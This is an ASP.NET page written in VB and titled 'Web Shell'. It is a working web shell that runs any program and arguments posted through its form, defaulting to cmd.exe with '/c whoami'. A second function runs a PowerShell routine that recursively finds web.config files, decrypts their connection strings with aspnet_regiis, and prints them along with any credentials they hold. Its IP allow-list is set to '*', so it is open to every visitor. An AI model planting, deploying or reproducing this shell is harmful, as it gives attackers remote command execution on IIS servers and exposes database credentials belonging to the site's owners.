<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
  Dim ipAddress As String = Request.UserHostAddress
  If String.IsNullOrEmpty(ipAddress) Then
    DenyAccess()
  Else
    Dim strAllowedIPs As String = "*"
    strAllowedIPs = Replace(Trim(strAllowedIPs), " ", "")
    Dim arrAllowedIPs = Split(strAllowedIPs, ",")
    Dim match As Integer = Array.IndexOf(arrAllowedIPs, ipAddress)
    If strAllowedIPs <> "*" And match < 0 Then
      DenyAccess()
    End If
  End If
End Sub

Protected Sub DenyAccess()
  Response.Clear
  Response.StatusCode = 403
  Response.End
End Sub

Protected Sub RunCmd(sender As Object, e As System.Web.UI.WebControls.CommandEventArgs)
  Dim myProcess As New Process()
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.Text)
  Dim titletext As String
  myProcessStartInfo.UseShellExecute = False
  myProcessStartInfo.RedirectStandardOutput = True
  myProcess.StartInfo = myProcessStartInfo

  If e.CommandArgument = "cmd" Then
    myProcessStartInfo.Arguments = xcmd.Text
    titletext = "Command Execution"
  ElseIf e.CommandArgument = "webconf" Then
    myProcessStartInfo.Arguments = " /c powershell -C ""$ErrorActionPreference = 'SilentlyContinue';"
    myProcessStartInfo.Arguments += "$path='" + webpath.Text + "'; write-host ""Searching for web.configs in $path ...`n"";"
    myProcessStartInfo.Arguments += "Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) { Try { $xml = [xml](get-content $file.FullName); } Catch { continue; } "
    myProcessStartInfo.Arguments += "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; } "
    myProcessStartInfo.Arguments += "if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null) "
    myProcessStartInfo.Arguments += "{ $tempdir = (Get-Date).Ticks; new-item $env:temp\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\$tempdir;"
    myProcessStartInfo.Arguments += "$aspnet_regiis = (get-childitem $env:windir\microsoft.net\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf ""connectionStrings"" ' + $env:temp + '\' + $tempdir;"
    myProcessStartInfo.Arguments += "Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\$tempdir\$file); } Catch { continue; }"
    myProcessStartInfo.Arguments += "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; }"
    myProcessStartInfo.Arguments += "remove-item $env:temp\$tempdir -recurse;} "
    myProcessStartInfo.Arguments += "Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host ""$file.Fullname --- $_.connectionString""} } }"""
    titletext = "Connection String Parser"
  End If

  myProcess.Start()
  Dim myStreamReader As StreamReader = myProcess.StandardOutput
  Dim myString As String = myStreamReader.ReadToEnd()
  myProcess.Close()
  myString = Replace(myString, "<", "&lt;")
  myString = Replace(myString, ">", "&gt;")
  history.Text = result.Text + history.Text
  result.Text = vbCrLf & "<p><h2>" & titletext & "</h2><pre>" & myString & "</pre>"
End Sub
</script>

<html>
<head>
<style>
body {
  background-image: url("images/repeat.jpg");
  background-repeat: repeat;
}
.para1 {
  margin-left: 30px;
  vertical-align: top;
}
.para2 {
  margin-left: 30px;
}
.para3 {
  margin-left: 20px;
  margin-top: 30px;
  vertical-align: top;
  background-image: url('images/post_middle.jpg');
}
.menu {
  margin-right: 56px;
  margin-bottom: 40px;
  vertical-align: top;
  font-weight: bold;
  font-family: Verdana, Arial, Helvetica, sans-serif;
  font-size: 12px;
}
.tbl_main_bdr {
  border: medium solid #333333;
}
.tbl_inside_bdr {
  border: thin solid #666666;
}
.style3 {
  margin-left: 20px;
  vertical-align: top;
  font-weight: bold;
  font-family: Verdana, Arial, Helvetica, sans-serif;
  font-size: 18px;
}
.post {
  background-repeat: no-repeat;
  background-image: url('images/post_top.jpg');
}
a:link {
  text-decoration: none;
  color: #000000;
}
a:hover {
  text-decoration: underline;
}
</style>
</head>
<body>

<form runat="server">
  <table border="0" cellspacing="4" cellpadding="4" width="750">
    <tr>
      <td><img src="data:image/png;base64,..."/></td>
      <td valign="bottom" align="right">
        <strong><span class="style21"><span class="style20"><font color="333333">Web Shell</font></span></span></strong>
      </td>
    </tr>
  </table>

  <table border="0" cellspacing="4" cellpadding="4">
    <tr>
      <td valign="middle" width="100" bgcolor="#CE112D" align="center"><strong>STEP 1</strong></td>
      <td valign="middle" width="150" bgcolor="#A0A0A0" align="center"><strong>ENTER COMMAND</strong></td>
      <td valign="top" width="350" bgcolor="#CCCCCC" align="left">
        <asp:Label id="L_p" runat="server">Application:</asp:Label><br>
        <asp:TextBox id="xpath" width="350" runat="server">c:\windows\system32\cmd.exe</asp:TextBox><br><br>
        <asp:Label id="L_a" runat="server">Arguments:</asp:Label><br>
        <asp:TextBox id="xcmd" width="350" runat="server" Text="/c whoami">/c whoami</asp:TextBox>
      </td>
      <td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
        <asp:Button id="Button" OnCommand="RunCmd" CommandArgument="cmd" runat="server" Width="100px" Text="RUN"></asp:Button>
      </td>
    </tr>

    <tr>
      <td valign="middle" width="100" bgcolor="#666666" align="center"><strong>STEP 2</strong></td>
      <td valign="middle" width="150" bgcolor="#A0A0A0" align="center"><strong>PARSE web.config</strong></td>
      <td valign="top" width="350" bgcolor="#CCCCCC" align="left">
        <asp:TextBox id="webpath" width="350" runat="server" Text="c:\inetpub">C:\inetpub</asp:TextBox>
      </td>
      <td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
        <asp:Button id="WebConfig" OnCommand="RunCmd" CommandArgument="webconf" runat="server" Width="100px" Text="RUN"></asp:Button>
      </td>
    </tr>
  </table>
</form>

<table border="0" cellspacing="4" cellpadding="4">
  <tr>
    <td valign="top" width="735" bgcolor="#CCCCCC" align="left">
      <asp:Label id="result" runat="server"></asp:Label>
      <font color="555555"><asp:Label id="history" runat="server"></asp:Label></font>
    </td>
  </tr>
</table>
</body>
</html>
